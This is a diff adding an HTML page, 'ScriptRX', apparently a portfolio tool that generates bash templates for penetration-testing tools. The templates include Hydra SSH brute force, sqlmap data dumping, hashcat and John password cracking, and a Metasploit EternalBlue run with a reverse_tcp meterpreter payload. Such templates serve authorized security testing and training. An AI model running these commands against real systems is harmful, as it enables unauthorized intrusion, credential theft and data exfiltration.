@@ -1,0 +1,865 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ScriptRX - Professional Security Command Builder</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        /* ANTIMEME STYLE GUIDE IMPLEMENTATION */
+        :root { 
+            --dot-color: rgba(0,0,0,0.08);
+            --paper-bg: #fdfdf9;
+        }
+
+        * { 
+            font-family: 'Courier New', Courier, monospace; 
+            color: black;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: var(--paper-bg);
+            min-height: 100vh;
+            position: relative;
+        }
+
+        /* DOT MATRIX PAPER BACKGROUND */
+        .dot-matrix {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: var(--paper-bg);
+            background-image: 
+                radial-gradient(circle, var(--dot-color) 1px, transparent 1px),
+                radial-gradient(circle, rgba(0,0,0,0.04) 1px, transparent 1px);
+            background-size: 3px 3px, 1.5px 1.5px;
+            background-position: 0 0, 1.5px 1.5px;
+            z-index: -1;
+        }
+
+        /* SCAN LINES OVERLAY */
+        .dot-matrix::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: repeating-linear-gradient(
+                0deg,
+                transparent,
+                transparent 2px,
+                rgba(0,0,0,0.015) 2px,
+                rgba(0,0,0,0.015) 4px
+            );
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        /* PERFORATION MARKS */
+        .dot-matrix::before {
+            content: '';
+            position: fixed;
+            left: 20px;
+            top: 0;
+            height: 100%;
+            width: 1px;
+            background-image: repeating-linear-gradient(
+                to bottom,
+                transparent,
+                transparent 3px,
+                #999 3px,
+                #999 5px,
+                transparent 5px,
+                transparent 10px
+            );
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        /* ANIMATED SCANLINE */
+        @keyframes scan {
+            0% { top: -2px; }
+            100% { top: 100%; }
+        }
+
+        .scanline {
+            position: fixed;
+            height: 2px;
+            width: 100%;
+            background: linear-gradient(
+                to bottom,
+                transparent,
+                rgba(0,0,0,0.1),
+                transparent
+            );
+            animation: scan 12s linear infinite;
+            pointer-events: none;
+            z-index: 2;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+            position: relative;
+            z-index: 10;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 3rem;
+            border: 1px solid black;
+            padding: 2rem;
+            background: white;
+        }
+
+        .header h1 {
+            font-size: 2.2rem;
+            font-weight: bold;
+            margin-bottom: 1.2rem;
+            letter-spacing: 2px;
+        }
+
+        .header p { 
+            opacity: 0.7; 
+            font-size: 1.2rem; 
+            margin-bottom: 1.2rem; 
+        }
+
+        .back-link {
+            display: inline-block;
+            background: white;
+            border: 1px solid black;
+            color: black;
+            padding: 0.5rem 1rem;
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: all 0.3s ease;
+        }
+
+        .back-link:hover { 
+            background: black; 
+            color: white; 
+        }
+
+        .clock { position: absolute; top: 1rem; right: 1rem; color: var(--accent); font-size: 0.9rem; }
+
+        .main-interface { display: grid; grid-template-columns: 2fr 1fr; gap: 2rem; margin-bottom: 2rem; }
+
+        .panel { 
+            border: 1px solid black; 
+            background: white; 
+            padding: 1.5rem; 
+        }
+
+        .panel h2 { 
+            margin-bottom: 1.5rem; 
+            font-size: 1.4rem; 
+            text-transform: uppercase; 
+            letter-spacing: 1px; 
+            font-weight: bold;
+        }
+
+        .form-group { margin-bottom: 1.5rem; }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-size: 1rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: bold;
+        }
+
+        .form-control {
+            width: 100%;
+            background: white;
+            border: 1px solid black;
+            color: black;
+            padding: 0.8rem;
+            font-size: 1rem;
+            outline: none;
+        }
+
+        .form-control:focus { 
+            border: 2px solid black; 
+        }
+
+        .btn {
+            background: white;
+            border: 1px solid black;
+            color: black;
+            padding: 0.8rem 1.5rem;
+            font-size: 1rem;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            letter-spacing: 1px;
+            margin: 4px;
+        }
+
+        .btn:hover { 
+            background: black; 
+            color: white; 
+        }
+
+        .btn:disabled { 
+            opacity: 0.5; 
+            cursor: not-allowed; 
+            background: white;
+        }
+
+        .output-area {
+            background: white;
+            border: 1px solid black;
+            padding: 1rem;
+            min-height: 250px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            color: black;
+            font-size: 0.9rem;
+            overflow-y: auto;
+            max-height: 400px;
+        }
+
+        .recommendations {
+            border: 1px solid black;
+            background: white;
+            padding: 1.5rem;
+        }
+
+        .tool-item {
+            margin-bottom: 1rem;
+            padding: 0.75rem;
+            border: 1px solid black;
+            background: white;
+        }
+
+        .tool-name { 
+            font-weight: bold; 
+            margin-bottom: 0.25rem; 
+            font-size: 1rem;
+        }
+        
+        .tool-reason { 
+            font-size: 0.9rem; 
+            opacity: 0.7;
+        }
+
+        .status-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0, 0, 0, 0.9);
+            border-top: 1px solid var(--primary);
+            padding: 0.5rem 1rem;
+            font-size: 0.8rem;
+            color: var(--dim);
+        }
+
+        @media (max-width: 768px) {
+            .main-interface { grid-template-columns: 1fr; }
+            .container { padding: 1rem; }
+        }
+    </style>
+</head>
+<body>
+    <div class="dot-matrix"></div>
+    <div class="scanline"></div>
+    
+    <div class="clock" id="clock"></div>
+    
+    <div class="container">
+        <div class="header">
+            <h1>SCRIPTRX</h1>
+            <p>Professional Security Command Builder</p>
+            <a href="../index.html" class="back-link">← Back to Portfolio</a>
+        </div>
+        
+        <div class="main-interface">
+            <div class="panel">
+                <h2 id="generatorTitle">Script Generator</h2>
+                
+                <div id="generatorContent">
+                    <div class="form-group">
+                        <label for="scriptType">Script Type:</label>
+                        <select id="scriptType" class="form-control">
+                            <option value="nmap-nse">Nmap NSE Script</option>
+                            <option value="metasploit-module">Metasploit Module</option>
+                            <option value="john-usage">John the Ripper Usage</option>
+                        </select>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="scriptName">Script Name:</label>
+                        <input type="text" id="scriptName" class="form-control" placeholder="e.g., 'web-scanner'">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="scriptDescription">Description:</label>
+                        <input type="text" id="scriptDescription" class="form-control" placeholder="e.g., 'Scans for web vulnerabilities'">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="scriptAuthor">Author:</label>
+                        <input type="text" id="scriptAuthor" class="form-control" placeholder="e.g., 'security-researcher'">
+                    </div>
+                    
+                    <div id="additionalFields"></div>
+                    
+                    <button id="generateBtn" class="btn">Generate Script</button>
+                    <button id="recommendBtn" class="btn" style="margin-left: 1rem;">Get Recommendations</button>
+                </div>
+            </div>
+            
+            <div class="recommendations">
+                <h2>TOOLS</h2>
+                <div id="recommendationsContent">
+                    <p style="opacity: 0.7; font-style: italic;">Click on any tool below to generate specific scripts</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="panel">
+            <h2>Generated Output</h2>
+            <div id="scriptOutput" class="output-area">Click "Generate Script" to create your security tool template...</div>
+            <div style="margin-top: 1rem;">
+                <button id="copyBtn" class="btn" disabled>Copy to Clipboard</button>
+                <button id="downloadBtn" class="btn" style="margin-left: 1rem;" disabled>Download Script</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="status-bar">
+        <span>ScriptRX v1.0.0 | Professional Security Command Builder | Ready</span>
+    </div>
+
+    <script>
+        // Update clock
+        function updateClock() {
+            const now = new Date();
+            document.getElementById('clock').textContent = now.toUTCString();
+        }
+        setInterval(updateClock, 1000);
+        updateClock();
+
+        // Dynamic script generation system
+
+        // Elements
+        const scriptType = document.getElementById('scriptType');
+        const scriptName = document.getElementById('scriptName');
+        const scriptDescription = document.getElementById('scriptDescription');
+        const scriptAuthor = document.getElementById('scriptAuthor');
+        const additionalFields = document.getElementById('additionalFields');
+        const generateBtn = document.getElementById('generateBtn');
+        const recommendBtn = document.getElementById('recommendBtn');
+        const scriptOutput = document.getElementById('scriptOutput');
+        const copyBtn = document.getElementById('copyBtn');
+        const downloadBtn = document.getElementById('downloadBtn');
+        const recommendationsContent = document.getElementById('recommendationsContent');
+
+        // Update additional fields based on script type
+        function updateAdditionalFields() {
+            additionalFields.innerHTML = '';
+            
+            if (scriptType.value === 'john-usage') {
+                additionalFields.innerHTML = `
+                    <div class="form-group">
+                        <label for="wordlist">Wordlist Path:</label>
+                        <input type="text" id="wordlist" class="form-control" placeholder="/usr/share/wordlists/rockyou.txt">
+                    </div>
+                    <div class="form-group">
+                        <label for="note">Usage Note:</label>
+                        <input type="text" id="note" class="form-control" placeholder="Additional usage notes">
+                    </div>
+                `;
+            }
+        }
+
+        // Generate script
+        function generateScript() {
+            const type = scriptType.value;
+            const name = scriptName.value || 'untitled-script';
+            const description = scriptDescription.value || 'Security script';
+            const author = scriptAuthor.value || 'security-researcher';
+            
+            let script = '';
+            
+            // Generate script based on current tool module
+            if (type.includes('nmap')) {
+                const targetHost = document.getElementById('targetHost')?.value || '192.168.1.1';
+                const scanPorts = document.getElementById('scanPorts')?.value || '1-1000';
+                const scanOptions = document.getElementById('scanOptions')?.value || '-sV -sC';
+                
+                script = `#!/bin/bash
+# ${name} - Nmap Security Scan
+# Description: ${description}
+# Author: ${author}
+
+echo "Starting Nmap scan..."
+
+# ${type.replace('nmap-', '').toUpperCase()} scan
+nmap ${scanOptions} -p ${scanPorts} ${targetHost}
+
+echo "Scan completed."`;
+                
+            } else if (type.includes('john')) {
+                const hashFile = document.getElementById('hashFile')?.value || 'hashes.txt';
+                const wordlist = document.getElementById('wordlist')?.value || '/usr/share/wordlists/rockyou.txt';
+                const hashType = document.getElementById('hashType')?.value || 'md5';
+                
+                script = `#!/bin/bash
+# ${name} - John the Ripper Password Cracking
+# Description: ${description}
+# Author: ${author}
+
+echo "Starting John the Ripper..."
+
+# ${type.replace('john-', '').toUpperCase()} attack
+john --format=${hashType} --wordlist=${wordlist} ${hashFile}
+
+# Show results
+john --show ${hashFile}
+
+echo "Password cracking completed."`;
+                
+            } else if (type.includes('sqlmap')) {
+                const targetUrl = document.getElementById('targetUrl')?.value || 'http://target.com/page?id=1';
+                const database = document.getElementById('database')?.value || 'information_schema';
+                const table = document.getElementById('table')?.value || 'users';
+                
+                script = `#!/bin/bash
+# ${name} - SQLMap SQL Injection Testing
+# Description: ${description}
+# Author: ${author}
+
+echo "Starting SQLMap..."
+
+# ${type.replace('sqlmap-', '').toUpperCase()} test
+sqlmap -u "${targetUrl}" --batch
+
+# Database enumeration
+sqlmap -u "${targetUrl}" --dbs --batch
+
+# Table enumeration
+sqlmap -u "${targetUrl}" -D ${database} --tables --batch
+
+# Data extraction
+sqlmap -u "${targetUrl}" -D ${database} -T ${table} --dump --batch
+
+echo "SQL injection testing completed."`;
+                
+            } else if (type.includes('msf')) {
+                const exploitModule = document.getElementById('exploitModule')?.value || 'exploit/windows/smb/ms17_010_eternalblue';
+                const targetHost = document.getElementById('targetHost')?.value || '192.168.1.100';
+                const payload = document.getElementById('payload')?.value || 'windows/x64/meterpreter/reverse_tcp';
+                const lhost = document.getElementById('lhost')?.value || '192.168.1.50';
+                
+                script = `#!/bin/bash
+# ${name} - Metasploit Exploitation
+# Description: ${description}
+# Author: ${author}
+
+echo "Starting Metasploit..."
+
+# Start msfconsole with resource file
+msfconsole -q -x "
+use ${exploitModule};
+set RHOSTS ${targetHost};
+set PAYLOAD ${payload};
+set LHOST ${lhost};
+exploit;
+"`;
+                
+            } else if (type.includes('masscan')) {
+                const targetRange = document.getElementById('targetRange')?.value || '192.168.1.0/24';
+                const portRange = document.getElementById('portRange')?.value || '1-1000';
+                const scanRate = document.getElementById('scanRate')?.value || '1000';
+                
+                script = `#!/bin/bash
+# ${name} - Masscan High-Speed Port Scan
+# Description: ${description}
+# Author: ${author}
+
+echo "Starting Masscan..."
+
+# ${type.replace('masscan-', '').toUpperCase()} scan
+masscan -p${portRange} ${targetRange} --rate=${scanRate}
+
+echo "Masscan completed."`;
+                
+            } else if (type.includes('gobuster')) {
+                const targetUrl = document.getElementById('targetUrl')?.value || 'http://target.com';
+                const wordlist = document.getElementById('wordlist')?.value || '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt';
+                const extensions = document.getElementById('extensions')?.value || 'php,html,txt';
+                
+                script = `#!/bin/bash
+# ${name} - Gobuster Directory Brute Force
+# Description: ${description}
+# Author: ${author}
+
+echo "Starting Gobuster..."
+
+# ${type.replace('gobuster-', '').toUpperCase()} scan
+gobuster dir -u ${targetUrl} -w ${wordlist} -x ${extensions}
+
+echo "Gobuster scan completed."`;
+                
+            } else if (type.includes('hydra')) {
+                const targetHost = document.getElementById('targetHost')?.value || '192.168.1.100';
+                const service = document.getElementById('service')?.value || 'ssh';
+                const username = document.getElementById('username')?.value || 'admin';
+                const password = document.getElementById('password')?.value || 'password123';
+                
+                script = `#!/bin/bash
+# ${name} - Hydra Brute Force Attack
+# Description: ${description}
+# Author: ${author}
+
+echo "Starting Hydra..."
+
+# ${type.replace('hydra-', '').toUpperCase()} attack
+hydra -l ${username} -p ${password} ${service}://${targetHost}
+
+echo "Hydra attack completed."`;
+                
+            } else if (type.includes('hashcat')) {
+                const hashFile = document.getElementById('hashFile')?.value || 'hashes.txt';
+                const hashMode = document.getElementById('hashMode')?.value || '0';
+                const attackMode = document.getElementById('attackMode')?.value || '0';
+                const wordlist = document.getElementById('wordlist')?.value || '/usr/share/wordlists/rockyou.txt';
+                
+                script = `#!/bin/bash
+# ${name} - Hashcat Password Recovery
+# Description: ${description}
+# Author: ${author}
+
+echo "Starting Hashcat..."
+
+# ${type.replace('hashcat-', '').toUpperCase()} attack
+hashcat -m ${hashMode} -a ${attackMode} ${hashFile} ${wordlist}
+
+echo "Hashcat attack completed."`;
+                
+            } else {
+                script = `#!/bin/bash
+# ${name} - Security Script
+# Description: ${description}
+# Author: ${author}
+
+echo "Starting ${name}..."
+
+# Add your commands here
+echo "Script completed."`;
+            }
+            
+            scriptOutput.textContent = script;
+            copyBtn.disabled = false;
+            downloadBtn.disabled = false;
+        }
+
+        // Get recommendations
+        function getRecommendations() {
+            const recommendations = [
+                { name: "NMAP (NSE)", reason: "Scriptable with Lua for network discovery & checks", type: "nmap" },
+                { name: "METASPLOIT", reason: "Modular exploitation & auxiliary modules (Ruby)", type: "metasploit" },
+                { name: "JOHN THE RIPPER", reason: "Password cracking, rules & wordlists", type: "john" },
+                { name: "SQLMAP", reason: "Automated SQL injection detection/exploitation", type: "sqlmap" },
+                { name: "MASSCAN", reason: "Very fast port scanner for large address spaces", type: "masscan" },
+                { name: "GOBUSTER/DIRBUSTER", reason: "Directory & file bruteforcing for web content discovery", type: "gobuster" },
+                { name: "HYDRA", reason: "Network login brute-force tool", type: "hydra" },
+                { name: "HASHCAT", reason: "GPU-accelerated password recovery", type: "hashcat" }
+            ];
+
+            recommendationsContent.innerHTML = recommendations.map(tool => `
+                <div class="tool-item" onclick="generateToolScript('${tool.type}', '${tool.name}')" style="cursor: pointer;">
+                    <div class="tool-name">${tool.name}</div>
+                    <div class="tool-reason">${tool.reason}</div>
+                </div>
+            `).join('');
+        }
+
+        // Switch to specific tool module
+        function generateToolScript(toolType, toolName) {
+            const generatorTitle = document.getElementById('generatorTitle');
+            const generatorContent = document.getElementById('generatorContent');
+            const additionalFields = document.getElementById('additionalFields');
+            
+            // Update title
+            generatorTitle.textContent = `${toolName} Generator`;
+            
+            // Clear additional fields
+            additionalFields.innerHTML = '';
+            
+            // Generate tool-specific form fields
+            let toolFields = '';
+            let scriptTypeOptions = '';
+            
+            switch(toolType) {
+                case 'nmap':
+                    scriptTypeOptions = `
+                        <option value="nmap-basic">Basic Network Scan</option>
+                        <option value="nmap-service">Service Detection</option>
+                        <option value="nmap-vuln">Vulnerability Scan</option>
+                        <option value="nmap-nse">NSE Script</option>
+                    `;
+                    toolFields = `
+                        <div class="form-group">
+                            <label for="targetHost">Target Host/IP:</label>
+                            <input type="text" id="targetHost" class="form-control" placeholder="e.g., 192.168.1.1 or target.com">
+                        </div>
+                        <div class="form-group">
+                            <label for="scanPorts">Port Range:</label>
+                            <input type="text" id="scanPorts" class="form-control" placeholder="e.g., 1-1000 or 22,80,443">
+                        </div>
+                        <div class="form-group">
+                            <label for="scanOptions">Scan Options:</label>
+                            <input type="text" id="scanOptions" class="form-control" placeholder="e.g., -sV -sC -O">
+                        </div>
+                    `;
+                    break;
+                    
+                case 'john':
+                    scriptTypeOptions = `
+                        <option value="john-wordlist">Wordlist Attack</option>
+                        <option value="john-rules">Rule-based Attack</option>
+                        <option value="john-incremental">Incremental Attack</option>
+                        <option value="john-mask">Mask Attack</option>
+                    `;
+                    toolFields = `
+                        <div class="form-group">
+                            <label for="hashFile">Hash File:</label>
+                            <input type="text" id="hashFile" class="form-control" placeholder="e.g., hashes.txt">
+                        </div>
+                        <div class="form-group">
+                            <label for="wordlist">Wordlist:</label>
+                            <input type="text" id="wordlist" class="form-control" placeholder="e.g., /usr/share/wordlists/rockyou.txt">
+                        </div>
+                        <div class="form-group">
+                            <label for="hashType">Hash Type:</label>
+                            <input type="text" id="hashType" class="form-control" placeholder="e.g., md5, sha1, ntlm">
+                        </div>
+                    `;
+                    break;
+                    
+                case 'sqlmap':
+                    scriptTypeOptions = `
+                        <option value="sqlmap-basic">Basic SQL Injection</option>
+                        <option value="sqlmap-dbs">Database Enumeration</option>
+                        <option value="sqlmap-tables">Table Enumeration</option>
+                        <option value="sqlmap-dump">Data Extraction</option>
+                    `;
+                    toolFields = `
+                        <div class="form-group">
+                            <label for="targetUrl">Target URL:</label>
+                            <input type="text" id="targetUrl" class="form-control" placeholder="e.g., http://target.com/page?id=1">
+                        </div>
+                        <div class="form-group">
+                            <label for="database">Database Name:</label>
+                            <input type="text" id="database" class="form-control" placeholder="e.g., information_schema">
+                        </div>
+                        <div class="form-group">
+                            <label for="table">Table Name:</label>
+                            <input type="text" id="table" class="form-control" placeholder="e.g., users">
+                        </div>
+                    `;
+                    break;
+                    
+                case 'metasploit':
+                    scriptTypeOptions = `
+                        <option value="msf-exploit">Exploit Module</option>
+                        <option value="msf-payload">Payload Generation</option>
+                        <option value="msf-auxiliary">Auxiliary Module</option>
+                        <option value="msf-post">Post Exploitation</option>
+                    `;
+                    toolFields = `
+                        <div class="form-group">
+                            <label for="exploitModule">Exploit Module:</label>
+                            <input type="text" id="exploitModule" class="form-control" placeholder="e.g., exploit/windows/smb/ms17_010_eternalblue">
+                        </div>
+                        <div class="form-group">
+                            <label for="targetHost">Target Host:</label>
+                            <input type="text" id="targetHost" class="form-control" placeholder="e.g., 192.168.1.100">
+                        </div>
+                        <div class="form-group">
+                            <label for="payload">Payload:</label>
+                            <input type="text" id="payload" class="form-control" placeholder="e.g., windows/x64/meterpreter/reverse_tcp">
+                        </div>
+                        <div class="form-group">
+                            <label for="lhost">Local Host:</label>
+                            <input type="text" id="lhost" class="form-control" placeholder="e.g., 192.168.1.50">
+                        </div>
+                    `;
+                    break;
+                    
+                case 'masscan':
+                    scriptTypeOptions = `
+                        <option value="masscan-fast">Fast Port Scan</option>
+                        <option value="masscan-specific">Specific Ports</option>
+                        <option value="masscan-range">Port Range</option>
+                    `;
+                    toolFields = `
+                        <div class="form-group">
+                            <label for="targetRange">Target Range:</label>
+                            <input type="text" id="targetRange" class="form-control" placeholder="e.g., 192.168.1.0/24">
+                        </div>
+                        <div class="form-group">
+                            <label for="portRange">Port Range:</label>
+                            <input type="text" id="portRange" class="form-control" placeholder="e.g., 1-65535 or 22,80,443">
+                        </div>
+                        <div class="form-group">
+                            <label for="scanRate">Scan Rate:</label>
+                            <input type="text" id="scanRate" class="form-control" placeholder="e.g., 1000 (packets per second)">
+                        </div>
+                    `;
+                    break;
+                    
+                case 'gobuster':
+                    scriptTypeOptions = `
+                        <option value="gobuster-dir">Directory Brute Force</option>
+                        <option value="gobuster-dns">DNS Subdomain</option>
+                        <option value="gobuster-vhost">Virtual Host</option>
+                    `;
+                    toolFields = `
+                        <div class="form-group">
+                            <label for="targetUrl">Target URL:</label>
+                            <input type="text" id="targetUrl" class="form-control" placeholder="e.g., http://target.com">
+                        </div>
+                        <div class="form-group">
+                            <label for="wordlist">Wordlist:</label>
+                            <input type="text" id="wordlist" class="form-control" placeholder="e.g., /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt">
+                        </div>
+                        <div class="form-group">
+                            <label for="extensions">File Extensions:</label>
+                            <input type="text" id="extensions" class="form-control" placeholder="e.g., php,html,txt">
+                        </div>
+                    `;
+                    break;
+                    
+                case 'hydra':
+                    scriptTypeOptions = `
+                        <option value="hydra-ssh">SSH Brute Force</option>
+                        <option value="hydra-http">HTTP Form</option>
+                        <option value="hydra-ftp">FTP Brute Force</option>
+                        <option value="hydra-rdp">RDP Brute Force</option>
+                    `;
+                    toolFields = `
+                        <div class="form-group">
+                            <label for="targetHost">Target Host:</label>
+                            <input type="text" id="targetHost" class="form-control" placeholder="e.g., 192.168.1.100">
+                        </div>
+                        <div class="form-group">
+                            <label for="service">Service:</label>
+                            <input type="text" id="service" class="form-control" placeholder="e.g., ssh, http-post-form, ftp">
+                        </div>
+                        <div class="form-group">
+                            <label for="username">Username:</label>
+                            <input type="text" id="username" class="form-control" placeholder="e.g., admin or userlist.txt">
+                        </div>
+                        <div class="form-group">
+                            <label for="password">Password:</label>
+                            <input type="text" id="password" class="form-control" placeholder="e.g., password123 or wordlist.txt">
+                        </div>
+                    `;
+                    break;
+                    
+                case 'hashcat':
+                    scriptTypeOptions = `
+                        <option value="hashcat-dict">Dictionary Attack</option>
+                        <option value="hashcat-brute">Brute Force</option>
+                        <option value="hashcat-rules">Rule-based</option>
+                        <option value="hashcat-mask">Mask Attack</option>
+                    `;
+                    toolFields = `
+                        <div class="form-group">
+                            <label for="hashFile">Hash File:</label>
+                            <input type="text" id="hashFile" class="form-control" placeholder="e.g., hashes.txt">
+                        </div>
+                        <div class="form-group">
+                            <label for="hashMode">Hash Mode:</label>
+                            <input type="text" id="hashMode" class="form-control" placeholder="e.g., 0 (MD5), 1000 (NTLM), 1800 (sha512crypt)">
+                        </div>
+                        <div class="form-group">
+                            <label for="attackMode">Attack Mode:</label>
+                            <input type="text" id="attackMode" class="form-control" placeholder="e.g., 0 (straight), 3 (brute force)">
+                        </div>
+                        <div class="form-group">
+                            <label for="wordlist">Wordlist:</label>
+                            <input type="text" id="wordlist" class="form-control" placeholder="e.g., /usr/share/wordlists/rockyou.txt">
+                        </div>
+                    `;
+                    break;
+            }
+            
+            // Update script type dropdown
+            const scriptTypeSelect = document.getElementById('scriptType');
+            scriptTypeSelect.innerHTML = scriptTypeOptions;
+            
+            // Add tool-specific fields
+            additionalFields.innerHTML = toolFields;
+            
+            // Clear output
+            scriptOutput.textContent = `Switched to ${toolName} module. Configure the parameters above and click "Generate Script" to create your ${toolName} script.`;
+            copyBtn.disabled = true;
+            downloadBtn.disabled = true;
+        }
+
+        // Copy to clipboard
+        function copyToClipboard() {
+            navigator.clipboard.writeText(scriptOutput.textContent)
+                .then(() => {
+                    const originalText = copyBtn.textContent;
+                    copyBtn.textContent = 'Copied!';
+                    setTimeout(() => {
+                        copyBtn.textContent = originalText;
+                    }, 2000);
+                })
+                .catch(err => {
+                    console.error('Failed to copy: ', err);
+                    alert('Failed to copy to clipboard');
+                });
+        }
+
+        // Download script
+        function downloadScript() {
+            const type = scriptType.value;
+            const name = scriptName.value || 'generated-script';
+            
+            let extension = '.txt';
+            if (type === 'nmap-nse') extension = '.nse';
+            if (type === 'metasploit-module') extension = '.rb';
+            if (type === 'john-usage') extension = '.txt';
+
+            const blob = new Blob([scriptOutput.textContent], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `${name}${extension}`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+
+        // Event listeners
+        scriptType.addEventListener('change', updateAdditionalFields);
+        generateBtn.addEventListener('click', generateScript);
+        recommendBtn.addEventListener('click', getRecommendations);
+        copyBtn.addEventListener('click', copyToClipboard);
+        downloadBtn.addEventListener('click', downloadScript);
+
+        // Initialize
+        updateAdditionalFields();
+        
+        // Auto-load recommendations on page load
+        setTimeout(getRecommendations, 1000);
+    </script>
+</body>
+</html>
